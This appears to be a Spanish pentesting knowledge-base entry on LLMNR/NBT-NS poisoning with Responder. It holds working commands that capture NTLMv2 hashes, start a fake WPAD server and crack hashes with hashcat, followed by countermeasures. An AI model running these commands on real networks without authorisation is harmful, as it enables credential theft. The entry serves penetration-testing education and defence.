---
title: Envenenamiento LLMNR/NBT-NS con Responder
slug: explotacion-mitm-responder
aliases: [Envenenamiento LLMNR/NBT-NS con Responder, Responder, LLMNR poisoning, NBT-NS poisoning, Net-NTLM, NetNTLMv2, NTLM relay]
fase: [Explotación]
plataforma: Red
dificultad: Intermedia
mitre: [T1557.001]
related: [explotacion-smb-relay, explotacion-hash-cracking, pass-the-hash, explotacion-mitm6]
learning_refs: []
---

# Envenenamiento LLMNR/NBT-NS con Responder

## Descripción
Técnica que aprovecha los protocolos de resolución de nombres por defecto en Windows (LLMNR y NBT-NS) para interceptar intentos de conexión fallidos. El atacante responde a estas solicitudes pretendiendo ser el recurso buscado, lo que induce a la víctima a enviar su hash NTLMv2 para autenticarse.

## Herramientas
- **Responder** (`-I`, `-f`, `-r`) — herramienta principal para envenenamiento de red y captura de credenciales.
- **Hashcat** (`-m 5600`) — para realizar el crackeo offline de los hashes NTLMv2 capturados.
- **John the Ripper** — alternativa para el crackeo de hashes.

## Comandos / Ejemplos

### Captura de hashes en la red local
```bash
# Iniciar Responder en una interfaz específica
sudo responder -I eth0 -f -d -w
# Resultado: captura de hashes NTLMv2 al resolver nombres inexistentes
```

### Análisis de los hashes capturados
```bash
# Los hashes se guardan en /usr/share/responder/logs/
# Crackear con hashcat usando un diccionario
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Uso de flags avanzadas
```bash
# -r: Responder a consultas NetBIOS para nombres WPAD
# -w: Iniciar el servidor WPAD falso
sudo responder -I eth0 -r -w -F
```

## Contramedidas
- Deshabilitar LLMNR mediante GPO (Computer Configuration > Administrative Templates > Network > DNS Client > Turn off Multicast Name Resolution).
- Deshabilitar NBT-NS en las propiedades de IPv4 de cada interfaz de red.
- Implementar WPAD mediante un registro DNS estático para evitar envenenamiento.
- Utilizar contraseñas robustas para mitigar el éxito del crackeo offline.

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1557.001: Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay. https://attack.mitre.org/techniques/T1557/001/
